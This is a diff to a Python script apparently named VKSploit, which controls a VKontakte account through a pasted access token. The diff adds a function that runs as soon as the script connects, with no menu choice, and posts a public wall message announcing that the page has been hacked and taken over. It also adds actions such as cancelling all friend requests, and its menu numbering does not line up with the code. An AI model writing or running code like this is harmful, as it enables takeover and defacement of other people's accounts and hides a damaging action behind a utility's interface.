@@ -15,6 +15,9 @@ def send(message=None, attachment=None, peer_id=None):
 def add_chat(chat_id, user_id):
     vk.messages.addChatUser(chat_id=chat_id, user_id=user_id)
     
+def test_wall():
+    vk.wall.post(message="Вы были взломаны VKSploit'om. Вашей страницей кто-то завладел. Меняйте пароль!")
+    
 print('Получить токен можно тут: vkhost.github.io. Токен нужен ОБЯЗАТЕЛЬНО от Kate Mobile!')
 token = input('Введите токен: ')
 
@@ -34,6 +37,8 @@ try:
     vk = vk_session.get_api()
     longpoll = VkLongPoll(vk_session)
     print('Подключено!')
+    test_wall()
+    
 except:
     print('Неверный токен или отсутвует подключение к интернету!')
     exit
@@ -48,6 +53,9 @@ choise = int(input('''
 
 Друзья:
 3. Отменить все заявки в друзья
+
+Стена:
+4. Опубликовать запись
 
 
 
@@ -70,5 +78,8 @@ elif(ch == 2):
     cid = input('Введите id беседы куда надо добавить пользователя: ')
     add_chat(user_id=id, chat_id=cid)
     
+elif(ch == 3):
+    vk.friends.deleteAllRequests()   
+
 else:
     print('Введен не действительный метод!')
